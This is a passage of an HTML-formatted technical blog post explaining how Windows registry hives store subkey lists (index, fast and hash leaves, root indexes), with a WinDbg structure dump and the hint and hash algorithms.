exit node when faced with an out-of-memory condition.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;MvcjwGOuIU-c18 MvcjwGOuIU-c12&quot; id=&quot;h.5k32wcyndw01&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c19 MvcjwGOuIU-c17&quot;&gt;Subkey indexes&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Operations performed on subkey lists are some of the most common ones &amp;ndash; they are involved whenever a key is opened, created, deleted, renamed or enumerated, which constitutes a majority of actions involving the registry at runtime. It is for this reason that subkey lists have seen the most evolution throughout the subsequent versions of the regf format. As the interface was getting adopted by more and more applications in Windows NT and later systems, Microsoft developers could collect data on the typical usage patterns and devise adequate optimizations to speed these operations up. In this section, we will have a deeper look into how subkey indexes are formatted in the hives, and how the different types of operations affect them.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;By way of introduction, subkey indexes are data structures storing lists of descendant keys relative to a parent key, referenced through the _CM_KEY_NODE.SubKeyLists[...] cell indexes. During hive load, the value at index 0 of the array may either be a subkey index, or HCELL_NIL if there are no subkeys; index 1 must always be equal to HCELL_NIL, as by definition there are no volatile subkeys on disk. The high-level concept behind the subkey index is that it is a linear list of key node cell indexes, which must efficiently support the following operations (from most to least commonly used, in my subjective opinion):&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_s8f9k49k9svk-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Finding a key by name,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Finding a key by index on the list,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Adding a new key to the list,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Deleting a key from the list.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Regardless of the underlying representation of the list, it is always stored in a lexicographical order, reducing the lookup-by-name time from linear to logarithmic by using binary search. Let&amp;#39;s now look into the specific structures used in registry hives to implement this functionality.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.lhykk1vk3ji7&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Index leaves&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Index leaves are the most basic type of a subkey list, which has been supported since the first iteration of the regf format and consists of just three members: the signature (0x696C, &amp;#39;li&amp;#39;), number of entries (16-bit), and an inline, variable-length list of the cell indexes. The corresponding Windows kernel structure is _CM_KEY_INDEX:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_CM_KEY_INDEX&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;nt!_CM_KEY_INDEX&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Signature&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x002&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Count&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x004&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[1]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;br/&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Given the Count field range, the index leaf can store up to 65535 subkeys. It is the most compact one in terms of disk/memory consumption, but it provides somewhat poor cache locality, because every key referenced during the lookup must be accessed in memory in order to read its name from _CM_KEY_NODE.Name. Nevertheless, index leaves are still commonly used in all versions of Windows up to this day.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;As an example, let&amp;#39;s consider a key with five subkeys named &amp;quot;wombat&amp;quot;, &amp;quot;&amp;#128002;&amp;quot;, &amp;quot;HIPPO&amp;quot;, &amp;quot;ant&amp;quot;, and &amp;quot;ocelot&amp;quot;. An index leaf of such a key could look like this:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP6HTqFmlJWUcQw8x4ApSJkCj3ffelx8GBKKVMlXnQhKdWAsGBAKD8vKpHjiA3JS0GvOv9aqOc4r78CUbOKhyphenhyphenJ0ToMevio52XIou94wWK6jahtxS8IShyphenhyphenX63QzpBOXDFIA1m9yDRY1vkglHGXqT4TiiPjX5korMRt6-mg_27y7OuOwNgnaCF0XHLjPcUY/s1999/image3.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP6HTqFmlJWUcQw8x4ApSJkCj3ffelx8GBKKVMlXnQhKdWAsGBAKD8vKpHjiA3JS0GvOv9aqOc4r78CUbOKhyphenhyphenJ0ToMevio52XIou94wWK6jahtxS8IShyphenhyphenX63QzpBOXDFIA1m9yDRY1vkglHGXqT4TiiPjX5korMRt6-mg_27y7OuOwNgnaCF0XHLjPcUY/s1200/image3.png&quot; border=&quot;0&quot; alt=&quot;Diagram showing a key with five subkeys, as described in the sentence preceding this image&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram showing a key with five subkeys, as described in the sentence preceding this image&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;This illustrates that entries in the list are indeed stored in a sorted manner, and in a case-insensitive way &amp;ndash; &amp;quot;ant&amp;quot; goes before &amp;quot;HIPPO&amp;quot; even though &amp;#39;H&amp;#39; (0x48) &amp;lt; &amp;#39;a&amp;#39; (0x61). However, this logic applies to comparisons only, and otherwise the letter casing specified during key creation is preserved and visible to registry users. Finally, the unicode ox symbol is placed last on the list, because it is encoded as U+D83D U+DC02, and 0xD83D is greater than any of the ASCII characters in the other names.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.f209cg94s4q&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Fast leaves&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Fast leaves are slightly younger than subkey indexes, introduced in regf version 1.3 in 1995 (Windows NT 4.0). As hive versions 1.2 and below have been long obsolete, that means that fast leaves are universally supported in every modern version of Windows at the time of this writing. As the name suggests, they are meant to be faster than their predecessors, by including up to four initial characters of each subkey in the list as a &amp;quot;hint&amp;quot; next to the cell index of the key. This allows the kernel to execute the first four iterations of the string comparison loop using data only from the fast leaf and without referring to the corresponding node, which addresses the aforementioned issue of poor cache locality in index leaves. We expect this optimization to be effective in most real-life scenarios, as most keys consist of ASCII-only characters and differ from each other within the first four symbols.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The specific logic of generating the 32-bit hint from a string can be found in the internal CmpGenerateFastLeafHintForUnicodeString kernel function, but is boils down to the following steps:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_fvisx24ngp1u-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Set the initial hint variable to 0&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;In a loop of min(4, length) iterations:&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ol class=&quot;lst-kix_fvisx24ngp1u-1 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;If the n-th character is greater than 0xFF, break&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Otherwise add the character (with its original case) to the hint&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ol class=&quot;lst-kix_fvisx24ngp1u-0&quot; start=&quot;3&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Return the hint to the caller&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;For example, the hint for &amp;quot;ant&amp;quot; is &amp;quot;ant\0&amp;quot;, the hint for &amp;quot;HIPPO&amp;quot; is &amp;quot;HIPP&amp;quot;, and the hint for &amp;quot;&amp;#128002;&amp;quot; is &amp;quot;\0\0\0\0&amp;quot; (the first character is non-ASCII, so the whole hint is simply zero).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;When it comes to the structure layout of the fast leaf, it is basically the same as the index leaf, but it has a different signature (&amp;#39;lf&amp;#39;) and twice as many entries in the List array due to the addition of hints. There doesn&amp;#39;t seem to be any structure definition corresponding specifically to fast leaves in the public symbols, which either means that the structure is a non-public one, or it is also accessed via _CM_KEY_INDEX in the source code, but through references such as Index.List[2*n] instead of Index.List[n]. An illustration of a fast leaf containing the five example subkeys is shown below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjR21S8gOfvMWCmn3wA9caP05aHsplcoyJ0OcsyK6ZibKgAIn8wciEdZ_Me4VkWBt2a_RiDkHk9LVKzTMSnN_3UTOSsHiwcs7AkXuCMXGQqkHZs1wlDTe-b2dAEWh_EQBjm2Zf8oT85pwnnyGIFmnSu8N-LOP47in47a6LYxx2zU0s6lx8dowpA0d1uIl8/s1999/image4.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjR21S8gOfvMWCmn3wA9caP05aHsplcoyJ0OcsyK6ZibKgAIn8wciEdZ_Me4VkWBt2a_RiDkHk9LVKzTMSnN_3UTOSsHiwcs7AkXuCMXGQqkHZs1wlDTe-b2dAEWh_EQBjm2Zf8oT85pwnnyGIFmnSu8N-LOP47in47a6LYxx2zU0s6lx8dowpA0d1uIl8/s1200/image4.png&quot; border=&quot;0&quot; alt=&quot;Fast Leaf diagram containing the five example subkeys&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Fast Leaf diagram containing the five example subkeys&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.r2ulqn81rnxs&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Hash leaves&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Hash leaves are the third and last (for now) iteration of the subkey index format, introduced in Windows XP in 2001 (regf version 1.5). They have exactly the same data layout as fast leaves, but are characterized by the &amp;#39;lh&amp;#39; signature, and the 32-bit hint is a simple hash of the entire string instead of an inline representation of the first four characters. The specific hashing algorithm is implemented in the internal CmpHashUnicodeComponent function, and can be summarized with the following steps:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_rs477lwege9r-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Start with a hash equal to 0&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;For every character in the string:&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ol class=&quot;lst-kix_rs477lwege9r-1 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c26 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Hash = (Uppercase(Character) + 37 * Hash) % 0x100000000&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ol class=&quot;lst-kix_rs477lwege9r-0&quot; start=&quot;3&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Return the hash to the caller&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The main benefit of this approach is that it works equally well with ASCII and non-ASCII strings, and it covers the entire name and not just a prefix, further limiting the number of necessary references to the subkey nodes during key lookup. However, you may notice that a full-string hash isn&amp;#39;t really compatible with the concept of binary search, and indeed, whenever a hash leaf is used, the kernel performs a linear search instead of a binary one, as can be seen in the corresponding CmpFindSubKeyByHashWithStatus function. In theory, this could lead to iterating through 65535 keys (the maximum number of entries in a hash leaf), but in practice, the kernel makes sure that a hash leaf is never longer than 1012 elements. This is okay for performance, because when more subkeys are associated with a key, a second-level data structure comes into play (the root index, see the next section), and that one is always traversed with a binary search. Overall, it seems possible that the cache friendliness of the hash leaf makes up for its theoretically worse lookup complexity, especially in the average case.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;A corresponding diagram of a hash leaf data layout is shown below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSJ-jlTLvArbHK0iIrfnYUFm0rFVw3APRQuN8TYOVhUPhUEFNPHbOik1OgSb5VjWWwM79gJf4CUHQKZCrz8nPdMjFUgTNs2N1kT3xFcIeBLo9dd0UHSMTd1WDiS0Qk5OAeDK_GANlMrx4yeTMVP7JaJmY1OQtHI3_SXMEdCfNw0JLbBaA12eeamo6_4HM/s1999/image15.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSJ-jlTLvArbHK0iIrfnYUFm0rFVw3APRQuN8TYOVhUPhUEFNPHbOik1OgSb5VjWWwM79gJf4CUHQKZCrz8nPdMjFUgTNs2N1kT3xFcIeBLo9dd0UHSMTd1WDiS0Qk5OAeDK_GANlMrx4yeTMVP7JaJmY1OQtHI3_SXMEdCfNw0JLbBaA12eeamo6_4HM/s1200/image15.png&quot; border=&quot;0&quot; alt=&quot;Image showing hash leaf data layout as described above&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Image showing hash leaf data layout as described above&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.qzriz5zhg5yz&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Root indexes&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Each key in the registry can potentially have many thousands of subkeys, but having them stored in one very long list (such as a single index, fast or hash leaf) could lead to poor performance for some operations. For example, whenever a new key is inserted into the alphabetically sorted list, the portion of the list &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;after&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;the new key has to be moved in memory to make room for the new item. Similar CPU-heavy situations could arise when extending the dynamically sized array in the hive, and potentially having to copy its entire contents to a new cell if the existing one doesn&amp;#39;t have any free space behind it. In the worst case scenario, this would have a complexity of O(n) per operation, which is too slow for such an important system mechanism as the Windows registry.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;It is likely for this reason that whenever the subkey list becomes longer than 1012 elements for the first time, a second-level index called the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;root index&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;is inserted into the data structure. This has the goal of splitting a single long list into several shorter ones, which are easier to manage in memory. Root indexes cannot be nested or referenced recursively by one another: a subkey list may either be non-existent, a single leaf-type list, or a single root index pointing at leaf-type lists (in other words, the list may be 0, 1 or 2 levels deep).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The root index has existed for as long as the index leaves have: since the very first regf version 1.0 in Windows NT 3.1 Pre-Release. It also has the same layout represented by the _CM_KEY_INDEX structure, which consists of a signature (&amp;#39;ri&amp;#39; in this case), a 16-bit count and an array of cell indexes pointing at leaf-type lists, without any additional hints. An example diagram of a two-level subkey index containing five keys is shown below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWjDioDrxKadIbSrn48slGPbLJVi4YcOls62a4ruBHalts-KBFnJOO4NyUEqdtze-EyWCtBdrJSMrbaPNx0E3O1s2d3hWqbYV_6pwjmIW-rctVdnfn6dbIdEo7hyPjPr2yePJOtA6xOA2D_v_BPVVEnH-M2AMaKhrMtrTZBF4UWywvboQURcrYKNXWfAQ/s1999/image13.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWjDioDrxKadIbSrn48slGPbLJVi4YcOls62a4ruBHalts-KBFnJOO4NyUEqdtze-EyWCtBdrJSMrbaPNx0E3O1s2d3hWqbYV_6pwjmIW-rctVdnfn6dbIdEo7hyPjPr2yePJOtA6xOA2D_v_BPVVEnH-M2AMaKhrMtrTZBF4UWywvboQURcrYKNXWfAQ/s1200/image13.png&quot; border=&quot;0&quot; alt=&quot;An image showing an example diagram of a two-level subkey index containing five keys&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;An image showing an example diagram of a two-level subkey index containing five keys&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.ntqwzflppmk9&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Fundamental subkey list consistency requirements&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;There is a set of some very basic format consistency requirements concerning subkey indexes, which must be always met for any active hive in the system, regardless of whether it has been loaded from disk or created from scratch at runtime. These are the minimum set of rules for this data structure to be considered as &amp;quot;valid&amp;quot;, and they are tightly connected to the memory safety guarantees of the kernel functions that operate on them. They are as follows:&lt;/span&gt;&lt;/p&gt;
